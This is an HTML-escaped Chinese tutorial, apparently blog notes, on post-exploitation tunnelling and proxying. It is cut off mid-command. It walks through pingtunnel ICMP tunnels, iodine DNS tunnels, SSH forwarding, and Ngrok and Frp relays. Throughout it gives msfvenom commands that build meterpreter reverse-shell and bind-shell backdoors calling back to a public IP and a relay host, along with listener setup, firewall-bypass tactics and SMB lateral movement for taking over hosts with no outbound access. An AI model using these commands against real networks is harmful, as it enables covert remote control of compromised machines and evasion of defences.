&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成后门&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 - f exe &amp;gt; xd.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MSF启动监听&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfconsole&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Kali开启隧道&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pingtunnel -type server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Win 开启隧道(管理员运行)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pingtunnel.exe -type client -l 127.0.0.1:3333 -s 192.168.46.66 -t 192.168.46.66:4444 -tcp 1 -noprint 1 -nolog 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;dns-隧道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dns-隧道&#34;&gt;#&lt;/a&gt; dns 隧道&lt;/h4&gt;
&lt;p&gt;（ 1 ）前提条件&lt;br&gt;
使用场景：内网主机只出网 DNS 协议数据&lt;br&gt;
项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3lhcnJpY2svaW9kaW5l&#34;&gt;https://github.com/yarrick/iodine&lt;/span&gt;&lt;br&gt;
 判断出网：nslookup &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iYWlkdS5jb20=&#34;&gt;http://www.baidu.com&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 2 ）设置方法&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;服务器：设置密码xiaodi并创建虚拟IP及绑定域名指向&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iodined -f -c -P xiaodi 192.168.0.1 ns1.xiaodi8.com -DD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;客户端：连接密码xiaodi并绑定域名指向&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iodine -f -M 200 -P xiaodi ns1.xiaodi8.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;尝试通讯尝试连接：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.0.2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 3 ）结果&lt;br&gt;
会在外网主机上建立一块名为 192.168.0.1 的网卡，并且密码是 xiaodi。在内网主机上有一块 192.168.0.2 的 ip 地址，可以让外网直接访问。即外网通过新生成的 DNS 隧道访问到内网机器，一般用来控制 linux 的 ssh，在 windows 上使用时需安装 openvpn。&lt;/p&gt;
&lt;h4 id=&#34;ssh-隧道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-隧道&#34;&gt;#&lt;/a&gt; ssh 隧道&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启ssh协议登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vi /etc/ssh/sshd_config&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PermitRootLogin yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PasswordAuthentication yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/init.d/ssh start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/init.d/ssh restart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;本地 8080 流量转发至跳板机 1122 ，解决出站规则限制问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh -CfNg -L 1122:192.168.1.15:8080 root@192.168.1.166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl http://127.0.0.1:1122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;本地 8080 流量转发至跳板机 1234 ，解决入站规则限制问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh -CfNg -R 1234:192.168.1.15:8080 root@47.94.236.117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl http://127.0.0.1:1234&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;代理技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代理技术&#34;&gt;#&lt;/a&gt; 代理技术&lt;/h3&gt;
&lt;h4 id=&#34;跳板机间接控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#跳板机间接控制&#34;&gt;#&lt;/a&gt; 跳板机间接控制&lt;/h4&gt;
&lt;p&gt;控制跳板机后，右键设置代理端口&lt;br&gt;
命令：socks 59578&lt;br&gt;
 操作：通过 profixier 设置代理服务器及代理规则后可以访问刀内网资产&lt;/p&gt;
&lt;h4 id=&#34;msf-正向控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf-正向控制&#34;&gt;#&lt;/a&gt; msf 正向控制&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成后门&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=3333 -f exe &amp;gt; bd.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;让不出网的机器去执行这个正向连接的后门:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/bind_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhost 192.168.11.129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 3333&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;cs-正向控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cs-正向控制&#34;&gt;#&lt;/a&gt; cs 正向控制&lt;/h4&gt;
&lt;p&gt;CS 控制上线 - 正向连接&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听器设置正向连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bind_tcp port&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成监听器为正向连接的后门供不出网肉鸡执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;打开会话交互连接不出网主机正向连接的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;connect ip port&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;不出网机器上线&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#不出网机器上线&#34;&gt;#&lt;/a&gt; 不出网机器上线&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/Safe/image-001.png&#34; alt&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;windows 2008 机器的控制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在控制 windows 10 的基础上，此时已经用 cs 上线此机器。通过 windows 2008 做反向连接到 windows 10 上，并在 window 10 上做端口转发。右键 windows 选择转发上线，生成木马，供 2008 执行获取其权限。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;windows 2012 机器的控制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果采用正向连接，因为其本身采用了入站限制，无法突破。&lt;br&gt;
如果采用反向连接，因为 windows 2008 采用了入站限制，仍无法突破。&lt;/p&gt;
&lt;p&gt;如果用 pingtunnel 将 tcp 流量转为 icmp 出 windows 2012 ，无法突破 windows 2008 的入站。因为到了 windows 2008 处时流量变成了 tcp，仍被限制。&lt;br&gt;
因为开了打印机服务，可以通过 smb 即文件共享协议来进行上线。&lt;/p&gt;
&lt;p&gt;创建 smb 的监听器，防火墙允许 smb 就可以借助 smb 管道，配合 smb 的横向移动利用，psexec 64 进行操作，前提是获取到其账户密码。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;防火墙限制绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;入站过滤上线：隧道技术正向硬刚、反向连接跳过、防火墙开关，删除规则，替换程序。&lt;br&gt;
出站过滤上线：隧道技术反向硬刚、正向连接跳过、防火墙开关，删除规则，替换程序。&lt;br&gt;
两者都有：smb 是否开启，进行 smb 隧道上线&lt;/p&gt;
&lt;p&gt;实际环境中两种方法都测试判断是入站还是出站限制或者两者都有&lt;br&gt;
第三种方案：单纯的内网环境、单纯的内网域环境（域控没有设置组策略防火墙同步）&lt;/p&gt;
&lt;h3 id=&#34;内网穿透上线&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内网穿透上线&#34;&gt;#&lt;/a&gt; 内网穿透上线&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;穿透的作用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;旨在代理连接肉鸡后实现本地渗透肉鸡网络架构&lt;br&gt;
（ 1 ）流量代理工具：Proxychains Proxifier&lt;br&gt;
（ 2 ）穿透项目：Ngrok Frp Spp Nps&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubmdyb2suY2M=&#34;&gt;https://www.ngrok.cc&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9zcHA=&#34;&gt;https://github.com/esrrhs/spp&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==&#34;&gt;https://github.com/fatedier/frp&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VoYW5nLWlvL25wcw==&#34;&gt;https://github.com/ehang-io/nps&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;ngrok-上线内网机器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ngrok-上线内网机器&#34;&gt;#&lt;/a&gt; Ngrok 上线内网机器&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;服务端配置：开通隧道-TCP协议-指向IP和端口-开通隧道-连接隧道&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;客户端连接服务端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;控制端连接 Ngrok 的服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./sunny clientid 133328291918&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;客户端生成后门配置监听&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=free.idcfengye.com lport=10134 -f exe -o tcp.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 8888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;frp上线内网机器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#frp上线内网机器&#34;&gt;#&lt;/a&gt; Frp 上线内网机器&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;服务器修改配置文件frps.ini：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[common]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bind_port = 7000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启动服务端：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./frps -c ./frps.ini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;控制端修改配置文件frpc.ini：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[common]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server_addr = 47.94.236.117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server_port = 7000 #frpc工作端口，必须和上面frps保持一致&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[msf]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type = tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_ip = 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_port = 5555 #转发给本机的 5555&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remote_port = 6000 #服务端用 6000 端口转发给本机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启动客户端：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./frpc -c ./frpc.ini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msf生成木马并监听&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6000 - f exe -o frp.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use 